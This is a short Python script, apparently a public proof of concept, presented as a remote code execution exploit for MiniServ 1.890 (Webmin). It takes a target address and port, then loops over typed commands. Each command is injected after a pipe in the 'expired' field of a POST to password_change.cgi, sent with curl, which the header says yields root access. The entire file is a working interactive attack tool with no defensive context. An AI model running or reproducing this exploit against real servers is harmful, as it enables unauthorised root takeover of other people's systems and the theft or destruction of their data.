#! /usr/bin/env python3

# exploit for MiniServ 1.890 (Webmin httpd) - Remote Code Execution with root access s

import optparse
import os

def arguements():

    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", help="To specify the Target IP Address", dest="target_ip")
    parser.add_option("-p", "--port", help="To specify the Target Port", dest="target_port")

    (options, arguements) = parser.parse_args()

    if not  options.target_ip:
        parser.error("[-] Please specify the target IP, use --help for more information")
    if not options.target_port:
        parser.error("[-] Please specify the target port, use --help for more information")

    return options

def exploit(target_ip, target_port, url, command):
    header = 'Referer: https://{}:{}/session_login.cgi'.format(target_ip,target_port)
    payload = 'user=gotroot&pam=&expired=2|echo "";{}'.format(command)
    os.system("curl -k {} -d '{}' -H '{}'".format(url,payload,header))

if __name__ == '__main__':
    try:
        options = arguements()
        target = options.target_ip
        port = options.target_port
        url = "https://"+target+":"+port+"/password_change.cgi"
        while True:
            command = input("cmd: ")
            exploit(target, port, url, command)
    except:
        print("[-] Command not executed!")
